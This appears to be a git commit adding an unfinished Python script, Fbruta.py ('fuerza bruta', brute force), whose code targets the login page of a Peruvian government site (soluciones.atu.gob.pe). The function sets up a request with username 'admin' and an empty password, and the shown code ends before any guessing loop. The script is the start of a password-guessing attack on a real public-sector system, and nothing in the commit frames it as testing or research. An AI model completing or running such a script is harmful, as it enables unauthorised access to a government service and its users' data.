6e58fdb401b6ec68cfa2559af9fe05af8f6fd8b2
Freddy Huallpacuna <oscar_ftg@yahoo.es>
2022-10-14 16:48:42 -0500

    avance Fbruta.py

---
+++ Fbruta.py
@@ -0,0 +1,6 @@
+import requests
+
+def fuerza_bruta():
+    url = "https://soluciones.atu.gob.pe/registroactividad/login" # url de la paguina
+    datos = {'username':'admin','password':'','Login':'submit'}
+    
